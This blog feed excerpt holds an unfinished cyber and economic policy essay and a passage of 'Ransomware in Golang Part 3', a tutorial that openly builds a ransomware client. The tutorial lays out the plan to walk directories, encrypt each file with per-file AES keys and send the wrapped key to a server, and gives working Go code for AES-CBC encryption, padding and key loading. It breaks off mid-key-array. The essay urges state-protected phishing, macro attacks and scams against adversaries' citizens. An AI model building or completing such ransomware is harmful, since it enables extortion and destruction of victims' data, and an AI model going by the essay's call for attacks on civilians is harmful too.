<!-- Additionally, we can position ourselves as the leaders in privacy. Public and private interests working to ensure the right to privacy for our citizens as well as a matter of foreign policy. This begins derisks the current hoards of data on Americans, while also making it patently clear how other govenrments spy on their countrymen. -->

<p>Now is the time to differentiate ourselves, on the world stage, in both software and hardware products. We can go kicking and screaming into the next 10 years, desperately filing sanctions to protect American businesses and the petrodollar, or alternatively, we can change the game that everyone is playing.</p>

<h3>On-Shoring</h3>

<p>Low interest rates and a weak dollar will allow the US to compete internationally on manufacturing. Rather than having a single region be the manufacturing hub of the entire world, and another region be the primary customer, we can bring that capability home and have the end-to-end pipeline within the United States and its neighbors.</p>

<p>This will enable us to on-shore capabilities that were previously unsustainable. This affects the software and hardware supply chain, which is an area that the US can strongly differentiate itself in.</p>

<p>Imagine a situation, such as a kinetic engagement, that caused trade to be cut off from a major manufacturing hub. The number of devices that we have limited to no capability to produce domestically, or even regionally, is astounding. The current environment allows us the opportunity to on-shore these capabilities and create sustainable ecosystems, however we must be willing to foster this.</p>

<h3>Data De-risking</h3>

<p>Data is extremely valuable. A mind numbing amount is collected about us daily. Where we go, who we are with, our interests, preferences, shopping habits, and financials - all are collected and sold by third parties. Online advertising is the primary driver of this collection. While a massive industry, the efficacy in deploying this data is questionable. [TODO CITATION]()</p>

<p>On the other hand, it is a massive security risk for private citizens as well as public interests. China used collected and stolen data in order to discover <a href="https://foreignpolicy.com/2020/12/21/china-stolen-us-data-exposed-cia-operatives-spy-networks/#">CIA agents</a> operating internationally. Data like this has been consistently lost through; the OPM hack, the Experian hack, the [TODO OTHER HIGH PROFILE HACKS].</p>

<p>Data collection is a liability and we must de-risk in this area. If an entity wishes to collect and store data on an individual, we need tight restrictions on its use and severe punishment for its loss. The individual should have a say in their data.</p>

<p>(Anecdote if appropriate: My address history is available online. I have never publicly posted these addresses online. Through some dataset, possibly voting records, credit reporting agencies, or the DMV, all of these are now publicly posted online. This is dangerous for individuals, especially those from vulnerable groups. This information can be used to SWAT people, stalk them, harass them, and provides a springboard to blackmail them.)</p>

<p>(Further if appropriate: Cell phone providers sell our location data in real time. Fuck them too.)</p>

<h3>Offensive Capabilities</h3>

<p>The United States of America leaves a lot of low hanging cyber capabilities shelved. While other countries actively engage in credential phishing, simple document macro attacks, and even Paypal and cryptocurrency scams, the US ignores these avenues of attack.</p>

<p>During capture the flag competitions, teams engage in the practice of chaffing. This is sending large amounts of noise across the shared network, such that another team recording packet captures will have a hard time sifting through that noise to discover the actual exploits being thrown. Cyber policy should take a similar approach. Raise the noise floor with low effort, high impact attacks in order to help mask the more rare high effort, high impact attacks.</p>

<p>These capabilities do not need to originate from the federal government. We simply need to promote and protect individuals who perform these attacks against adversaries, their industries, and citizens. In the same sense that email spam filtering is a growing 800 million dollar industry while no one is making near comparable investment addressing application level, protocol level, or system level design flaws, we want our adversaries to be as hopelessly prioritized. We can achieve this by creating problems for them.</p>

<p><a href="https://www.globenewswire.com/news-release/2019/02/18/1733713/0/en/Global-Enterprise-Spam-Filter-Market-Will-Reach-USD-2-675-Million-By-2026-Zion-Market-Research.html">Citation TODO is this reputable at all?</a></p>

<h3>Payments Infrastructure</h3>

<p>A major impediment to innovation is our current payment infrastructure. We have reached a digital age where we can move data near instantly at minimal cost, however, we have no way to pay a commensurate value for this data. Our online payment options are either embarassingly slow, or charge an effective 3% tax on any transaction. These also include minimum fees to make moving cents, not to mention fractions of a cent, infeasible.</p>

<p>This means that our digital economy is built off of advertising. This infrastructure allows digital properties to be <a href="https://www.investopedia.com/terms/c/cpm.asp">paid per 1000 views</a>. It effectively creates microtransactions, but at the cost of our attention and privacy.</p>

<p>We need a payments infrastructure that enables low fee, instant transactions. The <a href="https://www.frbservices.org/financial-services/fednow/index.html">FedNow</a> project could be this solution. A solution in this space will enable a true digital economy that removes advertisers as the brokers of all transactions and improves citizen privacy.</p>

<p>This will also greatly benefit brick and mortar businesses who are, on every transaction, effectively being charged a 1.3% tax that is paid to the banks and credit card processing companies. <a href="https://www.fool.com/the-ascent/research/average-credit-card-processing-fees-costs-america/">Citation TODO</a></p>

<h3>R&amp;D</h3>

<p>Increase funding in research and development.</p>

<p>An increased focus on transitioning research into products must be made. We should focus on projects that close a small research gap and lean heavily on development.</p>

<h3>New Infrastructure</h3>

<p>[](<a href="https://www.brookings.edu/on-the-record/defending-cyber-dominance/">https://www.brookings.edu/on-the-record/defending-cyber-dominance/</a>)</p>

<p>The Department of Defense understands the importance of a domestic supply chain. There are projects in the DoD that rely on foreign components. Previously we discussed the possibility of events which cut off this supply chain, but we also must consider the attacks which could be staged by an adversary with this level of control. This could mean faulty parts, adversarially planned obsolescence, or even hardware-based backdoors.</p>

<p>We are making effort here. Intel and TSMC are separately creating fabs in Arizona. Recently the DoD has launched an initiative to incentivize domestic chip manufacturing capabilities. This is critical infrastructure and should be prioritized as such.</p>

<p>We also have the opportunity to reduce attack surfaces at this time. While general purpose computing has revolutionized blah blah blah [TODO], it also creates an unmanagable mess. Understanding and managing the security of both the hardware and software stack is nigh untennable. Considering physical and remote attacks, part obsolescence, software aging, known and unknown vulnerabilities, and memory unsafe languages, our devices, infrastructure, and applications are rotting from their core.</p>

<p>We can reduce this attack surface significantly by making purpose built devices, operating systems, and applications. We should not be hobbling together whatever works in order to ship applications that bleed data. We should have low-level developers who understand their stacks such that they can build a system with the capabilities it needs and no more.</p>

<p>Additionally, security engineering could reform as a serious engineering discipline. In the same sense that we can provide tolerances for bridges, we should be able to provide assurances in the entire software supply chain.</p>

<h2>Policy</h2>

<p>Follows are laws and policy considerations for acheiving the above goals, as well as positioning the United States for a prosperous decade.</p>

<h3>Right to Privacy - The 28th Amendment</h3>

<p><em>Citizens shall have the right to control their personal information, from it being posted publically, collected, sold, or transferred.</em></p>

<p>An ammendment should be added to the constitution that guarantees the people&rsquo;s right to privacy.</p>

<h3>Cyber Letters of Marque and Reprisal (LOMAR-C)</h3>

<p>Throughout much of history, privateers were issued authorizations to attack and capture enemy vessels with which their issuing nation was at war. These authorizations laid out territories and rules of engagement for operations on the high seas. The same stance should be taken for cyber operations in order to acheive the goals outlined in Offsensive Capabilities.</p>

<p>These letters could define the nations to target, the goals for operations, and the prize law in the case of incentivized operations.</p>

<p>[](<a href="https://www.cyberlunarium.org/2020/06/cyber-lunarium-commission-001-case-for.html">https://www.cyberlunarium.org/2020/06/cyber-lunarium-commission-001-case-for.html</a>)</p>

<p>[](<a href="https://www.cyberlunarium.org/2020/07/clc004-and-reprisal.html">https://www.cyberlunarium.org/2020/07/clc004-and-reprisal.html</a>)</p>

<h3>Visible Cyber Retaliation</h3>

<p>With the letter of marque and reprisal system the United States will be able to visibly retaliate against cyber attacks, without burning valuable DoD capabilities. For example, the recent North Korean attacks against security researchers do not justify a government response. With the infrastructure of low tier capability, a response could be made simply by dictating attack direction.</p>

<p>[](<a href="https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/">https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/</a>)</p>

<h3>Right to Repair Laws</h3>

<p>(TODO: refine argument so this isn&rsquo;t calling for a regression from ICs)</p>

<p>In rebuilding our manufacturing base and promoting domestic capability, right to repair is essential. Currently, devices are systemizing as black box systems. In purchasing replacement car parts, you&rsquo;re no longer buying individual parts, but a collection of parts (TODO: lookup the industry word for this). Similarly for phones, they are largely unopenable, and the circuit boards are undocumented and difficult to modify. Appliances, such as washing machines are no longer a collection of parts, but a computer that is replaced at a considerably higher cost.</p>

<p>With no documentation for repair, this locks in manufacturing and guarantees a sale to the manufacturing hub. Repair captures the work domestically. It also improves the domestic knowledge base around technical matters.</p>

<h3>Software Assurance Measurements and Standards</h3>

<p>.</p>

<h3>Zero Tolerance on Corporate Weakness to Chinese Soft Power</h3>

<p>.</p>

<h3>Strategically Deploying Sanctions</h3>

<p>.</p>

<h3>Imigration</h3>

<p>Our primary objective is to maintain demand for US citizenship.</p>

<p>Increase immigration to meet the demands of the labor pool in this expansionary phase. This not only helps meet the demand in the cyber talent pool, but will free up citizens for advanced research positions.</p>

<p>In order for US citizens to have a comfortable retirement, they must own assets, and there must be demand for those assets. Given that we do not have enough babies to create this demand domestically, we should all be in favor of immigration. This will increase demand for our assets and ensure a comfortable retirement.</p>

<h3>Education</h3>

<p>An expansionary phase will create a demand for talent. To get the talent that we require, we need to lower the costs of education. This will allow more people to pursue advanced degrees, but it will also free them up to form their own companies after graduation and address economic needs, rather than chasing the highest ad-tech salary they can find.</p>

<p>Considering a paradigm shift in security engineering, we will need to work with universities to prepare students for this level of work. This will mean funding clubs, guiding the curriculum, and setting standards.</p>

<h3>Export Control Reform</h3>

<p>[](<a href="https://www.cnas.org/publications/reports/rethinking-export-controls-unintended-consequences-and-the-new-technological-landscape">https://www.cnas.org/publications/reports/rethinking-export-controls-unintended-consequences-and-the-new-technological-landscape</a>)</p>

<h2>Appendices</h2>

<h3>Appendix A - The Long Term Debt Cycle</h3>

<p>The long term debt cycle is a 50-75 year cycle. Interest rates rise for 15-20 years, they do not stay high, they then descend for 15-20 years, then they remain low for 20-30 years before rising again. It is hard to guage, but looking at 10 year bond yield going back to 1870, we are at the beginning of the bottom. It is likely that interest rates will remain low for the next decade, at least.</p>

<p><a href="https://stooq.com/q/?s=10usy.b&amp;c=mx&amp;t=l&amp;a=lg&amp;b=0">https://stooq.com/q/?s=10usy.b&amp;c=mx&amp;t=l&amp;a=lg&amp;b=0</a></p>

<h4>Implications of Low Interest Rates</h4>

<p>The global equities market has a total market capitalization, as of the end of 2020, of 95 trillion dollars. That is what investors value all publicly traded companies at. By contrast, the global bond market is around 100 trillion. With low interest rates, a significant amount of money is exiting bonds seeking yield.</p>

<p>Prices in the stock market will be driven up as money exits bonds looking for a home. Additionally, cash-flow producing assets will be desirable, e.g. real estate. Most importantly, this will be a time where a large amount of capital will be availble as investments to businesses. This will be an expansionary period in the United States.</p>

<h3>Appendix B - The Petrodollar</h3>

<p><em>This section is largely a (probably historically inaccurate) summary of this <a href="https://www.lynalden.com/fraying-petrodollar-system/">great article</a>. If you have time for the longform, I definitely recommend it.</em></p>

<p>In the early part of the 20th century the US dollar was backed by and redeemable for gold. During the Great Depression, that changed. People were exchanging their dollars for gold in a run on the banks. The US put an emergency halt on this. Continuing on that line, they made ownership of gold illegal and would purchase it from individuals at $20 per ounce. This was the start of the divergence from the gold standard.</p>

<p>Toward the end of WWII, the US controlled two thirds of the world&rsquo;s gold reserves. The <a href="https://en.wikipedia.org/wiki/Bretton_Woods_system">Bretton Woods</a> agreement established the US dollar and gold as the underlying assets in the global financial system.</p>

<p>The global reserve currency must run trade deficits (net importer) to continue supplying other nations with the reserve currecy they require. This is not sustainable, as pointed out by the <a href="https://en.wikipedia.org/wiki/Triffin_dilemma">Triffin Dilemma</a>. Running trade deficits ended up putting more dollars out into the world than the amount of gold the US held could cover at the fixed price of $35 dollars per ounce.</p>

<p>Due to this, Nixon ended the gold standard in the early 1970s. In order to maintain global demand for dollars, the US got <a href="https://en.wikipedia.org/wiki/OPEC">OPEC</a> to agree to only sell oil in US dollars. Hence, the birth of the petrodollar. There is a similar idea under Modern Monetary Theory that taxation is what can give fiat currecy value. An entity&rsquo;s desire to do business in an economy can only be achieved by paying tax in that economy&rsquo;s currency. This creates demand for the currecy. Similarly, on a global stage, to get access to oil you needed US dollars, which stimulated demand for US dollars.</p>

<p>We have benefited from this. Countries want our dollars so they compete on exports in order to get those dollars. Things get cheaper and quality of life improves for those with money. Unfortunately, we still need to run persistent trade deficits to maintain this. This comes at the expense of our manufacturing capabilities. We cannot run deficits forever.</p>

<p>Normally, countries would accumulate dollars then purchase treasuries to park their dollars and gain interest. This was a nice feedback loop into the system, allowing us to print more dollars and continue to run up our trade deficit.</p>

<p>China bucked this trend in 2012. Rather than buying US debt, they started loaning money to other countries for infrastructure projects. This was an investment in assets and trading partners. It does start to break down the petrodollar system though.</p>

<p>The idea here is that the dollar is in a position to weaken, but this is not a bad thing. A weaker dollar means that it will be cheaper for other countries to purchase our goods and services, we can balance our trade out and address the unsustainable deficit.</p>

<p>This may mean the end of the US dollar as the global reserve currency. It will remain important on the world stage, but we may see a shift to regional reserve currencies. Where the full-spectrum of trade could be contained regionally rather than globally.</p>

<h1>Positioning</h1>

<p>Interest rates are low. Use that leverage to acquire some assets that produce cashflow (i.e. real estate).</p>

<p>Investment capital is plentiful. Now is the time to build a business.</p>

<p>Use desperate venture capital to monopolize the cyber talent pool.</p>

<p>Patents around engineering regulation and assurance.</p>

<p>Regulation around tooling and intellectual property.</p>

<p>A major conflict in 10-20 years, at the end of the expansionary phase. Be positioned as a defense contractor to profit.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Fri, 25 Dec 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>The Client - Ransomware in Golang Part 3</title>
      <link>https://tacix.at/posts/The Client - Ransomware in Golang Part 3.html</link>
      <description>We write the wares...</description>
      <content:encoded><![CDATA[<p>We&rsquo;re ready to write the client for our malware! We have the server&rsquo;s keypair and some understand of how to build this, so let&rsquo;s get started.</p>

<p><em>If you haven&rsquo;t seen the other posts, you can follow along from the beginning at <a href="https://tacix.at">tacix.at</a>.</em></p>

<p>Following is a high level sketch of what our client needs to do.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// generate client keypair
</span><span style="color:#75715e"></span><span style="color:#75715e">// encrypt client private key with server public key
</span><span style="color:#75715e"></span><span style="color:#75715e">// post encrypted client private key to server (TBD)
</span><span style="color:#75715e"></span><span style="color:#75715e">// walk target directory
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// at each file
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// generate file key
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// read file
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// encrypt file
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// encrypt file key with client public key
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// store encrypted file key
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// write encrypted data back to file
</span></pre>
<p>Pretty easy! We have already learned most of these things in previous posts. The largest missing piece is encrypting the file. Since our RSA keys can barely encrypt 63 bytes of data, and files can be much larger than 63 bytes, we will need to use something else. For this we will use AES which is a symmetric encryption algorithm.</p>

<h2>Symmetric Encryption with AES</h2>

<p>What we will be doing is generating an AES key for each file, encrypting the file with that, then encrypting that key with the client&rsquo;s public key. So let&rsquo;s figure out how to use AES.</p>

<p>AES is a symmetric encryption algorithm, which means it uses the same key for decryption as it does for encryption. We are going to be using AES in cipher block chaining (CBC) mode. There are 5 modes and <a href="https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb">nerds patronizingly explain them to each other to show that they&rsquo;ve read StackOverflow.</a></p>

<p>What do we need for AES CBC? We need a randomly generated key (secret), a randomly generated initialization vector (IV) (not secret), a plaintext to encrypt (secret), and some padding to make sure the plaintext length is a multiple of the key size. The key and IV are 16 bytes (128 bits). We&rsquo;ll do no padding for this first go.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/sym.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;crypto/aes&#34;</span>
	<span style="color:#e6db74">&#34;crypto/cipher&#34;</span>
	<span style="color:#e6db74">&#34;crypto/rand&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#75715e">// 16 byte buffer for our key
</span><span style="color:#75715e"></span>	k <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">16</span>)
	<span style="color:#75715e">// fill buffer with random data
</span><span style="color:#75715e"></span>	rand.<span style="color:#a6e22e">Read</span>(k)
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;k:  %x\n&#34;</span>, k)

	<span style="color:#75715e">// create a cipher using our key
</span><span style="color:#75715e"></span>	blk, err <span style="color:#f92672">:=</span> aes.<span style="color:#a6e22e">NewCipher</span>(k)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}

	<span style="color:#75715e">// ditto key but for the IV (also length 16)
</span><span style="color:#75715e"></span>	iv <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, blk.<span style="color:#a6e22e">BlockSize</span>())
	rand.<span style="color:#a6e22e">Read</span>(iv)
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;iv: %x\n&#34;</span>, iv)

	<span style="color:#75715e">// create our CBC encryptor and decyptor
</span><span style="color:#75715e"></span>	enc <span style="color:#f92672">:=</span> cipher.<span style="color:#a6e22e">NewCBCEncrypter</span>(blk, iv)
	dec <span style="color:#f92672">:=</span> cipher.<span style="color:#a6e22e">NewCBCDecrypter</span>(blk, iv)

	<span style="color:#75715e">// plaintext
</span><span style="color:#75715e"></span>	p <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">byte</span>{<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>}
	<span style="color:#75715e">// ciphertext (same size as plaintext + padding)
</span><span style="color:#75715e"></span>	c <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, len(p))

	<span style="color:#75715e">// encrypt!
</span><span style="color:#75715e"></span>	enc.<span style="color:#a6e22e">CryptBlocks</span>(c, p)

	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;p:  %x\n&#34;</span>, p)
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;c:  %x\n&#34;</span>, c)

	<span style="color:#75715e">// zero the plaintext to check decryption works
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> p {
		p[i] = <span style="color:#ae81ff">0</span>
	}

	<span style="color:#75715e">// decrypt!
</span><span style="color:#75715e"></span>	dec.<span style="color:#a6e22e">CryptBlocks</span>(p, c)
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;p:  %x\n&#34;</span>, p)
}
</pre>
<p>Pretty straight forward. Now we have some fun problems. We need to pad the plaintext when <code>len(p) % block_size != 0</code>. The scheme for this actually also pads it when <code>len(p) % block_size == 0</code> as well, but in that situation it wasn&rsquo;t strictly necessary, it just makes our lives easier.</p>

<p>This padding scheme is from a standard called PKCS#7. It is detailed on <a href="https://datatracker.ietf.org/doc/html/rfc2315#page-21">page 21 of RFC 2315</a>. Basically, we&rsquo;re always going to add padding and we&rsquo;re going to use the number of bytes as the byte value for the padding. For example, if we need 1 byte of padding, we are going to add <code>{0x01}</code> to the end of the plaintext. If we needed two bytes of padding we would add <code>{0x02, 0x02}</code> to the end of the plaintext. If we needed 0 bytes of padding (assuming block size of 16), we would still add padding, in this case, <code>{0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10}</code>. That&rsquo;s sixteen 16s. Why add padding when we don&rsquo;t need any? Well, this way lets us just check the last byte, read that many bytes off the end, verify they are all the same byte, then proceed.</p>

<p>We&rsquo;ll make a little pad function. The <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo</a> of the block size gives us how many bytes beyond the block size multiple we have. So we really want the difference <code>blocksize - (len(p) % blocksize)</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/pad.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;bytes&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">pad</span>(bs []<span style="color:#66d9ef">byte</span>, blksz <span style="color:#66d9ef">int</span>) []<span style="color:#66d9ef">byte</span> {
	<span style="color:#75715e">// default to block size
</span><span style="color:#75715e"></span>	count <span style="color:#f92672">:=</span> blksz
	<span style="color:#75715e">// if we have leftover bytes
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> len(bs) <span style="color:#f92672">%</span> blksz <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
		<span style="color:#75715e">// difference between blocksize and leftover bytes
</span><span style="color:#75715e"></span>		count = blksz  <span style="color:#f92672">-</span> (len(bs) <span style="color:#f92672">%</span> blksz)
	}
	<span style="color:#75715e">// create padding buffer
</span><span style="color:#75715e"></span>	padding <span style="color:#f92672">:=</span> bytes.<span style="color:#a6e22e">Repeat</span>([]<span style="color:#66d9ef">byte</span>{byte(count)}, count)
	<span style="color:#75715e">// append padding to plaintext
</span><span style="color:#75715e"></span>	bs = append(bs, padding<span style="color:#f92672">...</span>)
	<span style="color:#75715e">// return bs
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> bs
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#75715e">// a quick test
</span><span style="color:#75715e"></span>	bs <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">byte</span>{<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x55</span>}
	bs = <span style="color:#a6e22e">pad</span>(bs, <span style="color:#ae81ff">16</span>)
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%x\n&#34;</span>, bs)
}
</pre>
<h2>The Client</h2>

<p>We&rsquo;ll start out by loading our keys in an <code>init()</code> function. This function runs automatically at the start of the program.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// client/main.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;crypto/rand&#34;</span>
	<span style="color:#e6db74">&#34;crypto/rsa&#34;</span>
	<span style="color:#e6db74">&#34;crypto/x509&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
	<span style="color:#e6db74">&#34;math/big&#34;</span>
)

<span style="color:#66d9ef">var</span> clientKey <span style="color:#f92672">*</span>rsa.PublicKey
<span style="color:#66d9ef">var</span> serverKey <span style="color:#f92672">*</span>rsa.PublicKey
<span style="color:#66d9ef">var</span> serverKeyBytes = []<span style="color:#66d9ef">byte</span>{
	<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x01</span>,
	<span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x72</span>,
	<span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x6c</span>,
	<span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x99</span>,
	<span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xbb</span>,
	<span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0xc7</span>,
	<span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x49</span>,
	<span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0xda</span>,
	<span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0xfc</span>,
	<span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x3e</span>,
	<span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x55</span>,
	<span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0xf4</span>,
	<span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xf2</span>,
	<span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x40</span>,
	<span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0xdc</span>,
	<span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0x84</span>,
	<span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x80</span>,
	<span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x26</span>,
	<span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x92</span>,
